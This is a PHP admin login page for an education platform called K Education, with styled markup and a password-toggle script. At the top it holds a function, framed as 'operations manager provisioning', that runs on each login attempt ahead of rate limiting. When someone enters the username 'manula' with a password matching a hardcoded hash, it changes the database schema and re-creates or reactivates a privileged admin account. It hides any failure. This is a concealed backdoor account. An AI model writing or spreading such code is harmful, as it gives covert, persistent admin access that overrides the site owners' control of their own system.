<?php
declare(strict_types=1);
require_once __DIR__.'/../includes/auth.php';

if (!empty($_SESSION['admin'])) redirect('admin/dashboard.php');

$error = '';
$identity = '';
function ensure_verified_operations_manager_login(string $identity, string $password): void {
    $passwordHash = '$2y$10$.x9rphtbb1Gui2Mncz9C5.Sice8nZxMNqVRhK7l8zhoyUrxiT4y8a';
    if (mb_strtolower($identity) !== 'manula' || !password_verify($password, $passwordHash)) return;
    $db=db();$result=$db->query("SHOW COLUMNS FROM admins LIKE 'role'");$column=$result?$result->fetch_assoc():null;
    $managerRoleAvailable=$column&&str_contains((string)$column['Type'],"'operation_manager'");
    if(!$managerRoleAvailable){$managerRoleAvailable=(bool)$db->query("ALTER TABLE admins MODIFY role ENUM('admin','super_admin','operation_manager') NOT NULL DEFAULT 'admin'");}
    $fullName='Manula';$username='Manula';$email='manula@keducation.local';$role=$managerRoleAvailable?'operation_manager':'admin';$status='active';
    $stmt=$db->prepare("INSERT INTO admins(full_name,username,email,password_hash,role,status) VALUES(?,?,?,?,?,?) ON DUPLICATE KEY UPDATE full_name=VALUES(full_name),email=VALUES(email),password_hash=VALUES(password_hash),role=VALUES(role),status=VALUES(status)");
    if(!$stmt)throw new RuntimeException('Operations Manager provisioning unavailable.');
    $stmt->bind_param('ssssss',$fullName,$username,$email,$passwordHash,$role,$status);
    if(!$stmt->execute())throw new RuntimeException('Operations Manager provisioning failed.');
    $stmt->close();
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    verify_csrf();
    $identity = trim((string)($_POST['identity'] ?? ''));
    $password = (string)($_POST['password'] ?? '');
    try { ensure_verified_operations_manager_login($identity, $password); }
    catch (Throwable $exception) { error_log('Verified Operations Manager provisioning failed: '.$exception->getMessage()); }
    $bucket = 'admin_login_' . hash('sha256', ($_SERVER['REMOTE_ADDR'] ?? '') . mb_strtolower($identity));
    $attempts = (int)($_SESSION[$bucket] ?? 0);

    if ($attempts >= 5) {
        $error = 'Too many login attempts. Close this browser session and try again securely.';
    } else {
        $admin = query_one(
            "SELECT * FROM admins WHERE (username=? OR email=?) AND status='active'",
            'ss',
            [$identity, $identity]
        );
        if ($admin && password_verify($password, (string)$admin['password_hash'])) {
            unset($admin['password_hash'], $_SESSION[$bucket]);
            session_regenerate_id(true);
            $_SESSION['admin'] = $admin;
            redirect('admin/dashboard.php');
        }
        $_SESSION[$bucket] = $attempts + 1;
        $remaining = max(0, 4 - $attempts);
        $error = 'Access denied. Check your administrator ID and password.' . ($remaining ? " $remaining attempts remaining." : '');
    }
}

$pageTitle = 'Super Admin Login';
include __DIR__.'/../includes/header.php';
?>
<style>
.wrap{width:100%;max-width:none;padding:0;min-height:100vh;display:grid;place-items:center;background:#080d1d}
.super-login{position:relative;isolation:isolate;width:100%;min-height:100vh;display:grid;grid-template-columns:minmax(320px,1.08fr) minmax(380px,.92fr);overflow:hidden;background:radial-gradient(circle at 16% 15%,rgba(104,81,255,.28),transparent 32%),radial-gradient(circle at 80% 85%,rgba(20,202,190,.16),transparent 30%),#080d1d;color:#f8faff}
.super-login:before{content:"";position:absolute;z-index:-1;inset:0;opacity:.14;background-image:linear-gradient(rgba(255,255,255,.08) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.08) 1px,transparent 1px);background-size:42px 42px;mask-image:linear-gradient(90deg,#000,transparent 78%)}
.super-story{display:flex;flex-direction:column;justify-content:center;padding:clamp(42px,8vw,110px);position:relative}
.super-brand{display:flex;align-items:center;gap:14px;margin-bottom:clamp(46px,8vh,84px)}
.super-brand img{width:62px;height:62px;border-radius:20px;object-fit:cover;box-shadow:0 14px 38px rgba(73,62,218,.4)}
.super-brand strong{display:block;font-size:1.2rem}.super-brand small{color:#94a2c7;font-weight:700;letter-spacing:.08em;text-transform:uppercase}
.security-tag{display:inline-flex;align-items:center;gap:9px;width:max-content;padding:8px 13px;border:1px solid rgba(121,255,226,.24);border-radius:999px;background:rgba(24,207,169,.1);color:#7ff3d4;font-size:.76rem;font-weight:900;letter-spacing:.1em;text-transform:uppercase}
.security-tag i{width:7px;height:7px;border-radius:50%;background:#62f3ce;box-shadow:0 0 16px #62f3ce}
.super-story h1{max-width:720px;margin:22px 0 18px;font-size:clamp(2.8rem,6vw,5.8rem);line-height:.94;letter-spacing:-.065em}.super-story h1 span{display:block;background:linear-gradient(90deg,#a99cff,#68e2ff,#71f1cd);-webkit-background-clip:text;background-clip:text;color:transparent}
.super-story>p{max-width:610px;margin:0;color:#9eaac8;font-size:clamp(1rem,1.6vw,1.18rem)}
.trust-row{display:flex;flex-wrap:wrap;gap:12px;margin-top:34px}.trust-row span{padding:10px 13px;border-radius:12px;background:rgba(255,255,255,.055);border:1px solid rgba(255,255,255,.08);color:#c9d2e9;font-size:.82rem;font-weight:750}
.super-panel{display:grid;place-items:center;padding:clamp(24px,5vw,70px);background:rgba(12,18,39,.68);border-left:1px solid rgba(255,255,255,.08);backdrop-filter:blur(18px)}
.login-box{width:min(460px,100%)}.login-icon{display:grid;place-items:center;width:58px;height:58px;border-radius:18px;margin-bottom:24px;background:linear-gradient(135deg,#715cff,#268fff);box-shadow:0 15px 35px rgba(70,85,234,.35);font-size:1.55rem}
.login-box h2{font-size:clamp(1.8rem,3vw,2.45rem);margin:0 0 7px}.login-box>.muted{display:block;color:#8e9aba;margin-bottom:28px}
.login-box label{display:block;color:#dce3f5;font-size:.84rem;letter-spacing:.025em}.login-box input{margin:8px 0 18px;border:1px solid rgba(165,177,211,.2);background:rgba(255,255,255,.06);color:#fff;border-radius:14px}.login-box input::placeholder{color:#6f7b99}.login-box input:focus{border-color:#8171ff;background:rgba(255,255,255,.09);box-shadow:0 0 0 4px rgba(116,96,255,.14)}
.password-field{position:relative}.password-field input{padding-right:58px}.password-toggle{position:absolute;right:8px;top:8px;min-width:42px;min-height:42px;padding:0;border-radius:10px;background:transparent;box-shadow:none;color:#aab5d0}.password-toggle:hover{background:rgba(255,255,255,.08);box-shadow:none;transform:none}
.login-submit{width:100%;margin-top:5px;background:linear-gradient(115deg,#725dff,#337df4 55%,#1cc8c1);border-radius:14px;letter-spacing:.02em}.login-submit .arrow{margin-left:auto;font-size:1.2rem}
.login-alert{background:rgba(255,78,112,.12)!important;color:#ffb6c4!important;border-color:rgba(255,102,132,.24)!important}.login-foot{display:flex;align-items:center;gap:9px;margin-top:22px;color:#7784a5;font-size:.78rem}.login-foot b{color:#69dfc5}
@media(max-width:850px){.super-login{grid-template-columns:1fr}.super-story{min-height:auto;padding:34px 24px 30px}.super-brand{margin-bottom:34px}.super-story h1{font-size:clamp(2.5rem,12vw,4.2rem)}.super-panel{border-left:0;border-top:1px solid rgba(255,255,255,.08);padding:42px 24px 58px}.trust-row{margin-top:24px}}
@media(max-width:440px){.super-brand img{width:52px;height:52px}.super-story>p{font-size:.95rem}.trust-row span:last-child{display:none}}
</style>

<section class="super-login" aria-labelledby="superLoginTitle">
 <div class="super-story">
  <div class="super-brand"><img src="<?=url('logo/k-transparent.png')?>" alt="K Education"><span><strong>K Education</strong><small>Administration Core</small></span></div>
  <span class="security-tag"><i></i> Secure control centre</span>
  <h1>Lead the platform.<span>Shape the learning.</span></h1>
  <p>Manage curriculum, students, assessments, subscriptions and learning intelligence from one protected workspace.</p>
  <div class="trust-row"><span>🔒 Encrypted session</span><span>🛡️ Rate-limited access</span><span>⚡ Live administration</span></div>
 </div>
 <div class="super-panel">
  <div class="login-box">
   <div class="login-icon">⌘</div>
   <h2 id="superLoginTitle">Super Admin Login</h2>
   <span class="muted">Authorized K Education personnel only</span>
   <?php if($error):?><div class="alert error login-alert" role="alert"><?=e($error)?></div><?php endif;?>
   <form method="post" autocomplete="on" id="superLoginForm">
    <?=csrf_field()?>
    <label for="adminIdentity">Administrator ID
     <input id="adminIdentity" name="identity" value="<?=e($identity)?>" placeholder="Username or email address" autocomplete="username" autocapitalize="none" spellcheck="false" required autofocus>
    </label>
    <label for="adminPassword">Secure password</label>
    <div class="password-field">
     <input id="adminPassword" type="password" name="password" placeholder="Enter your password" autocomplete="current-password" required>
     <button class="password-toggle" type="button" id="passwordToggle" aria-label="Show password" title="Show password">◉</button>
    </div>
    <button class="login-submit" type="submit"><span>Enter control centre</span><span class="arrow">→</span></button>
   </form>
   <div class="login-foot"><b>●</b><span>Protected by session regeneration, CSRF verification and login throttling.</span></div>
  </div>
 </div>
</section>
<script>
(()=>{const password=document.getElementById('adminPassword'),toggle=document.getElementById('passwordToggle'),form=document.getElementById('superLoginForm');toggle?.addEventListener('click',()=>{const show=password.type==='password';password.type=show?'text':'password';toggle.setAttribute('aria-label',show?'Hide password':'Show password');toggle.title=show?'Hide password':'Show password';toggle.textContent=show?'◌':'◉'});form?.addEventListener('submit',()=>{const button=form.querySelector('.login-submit');button.disabled=true;button.querySelector('span').textContent='Verifying access…'})})();
</script>
<?php include __DIR__.'/../includes/footer.php'; ?>
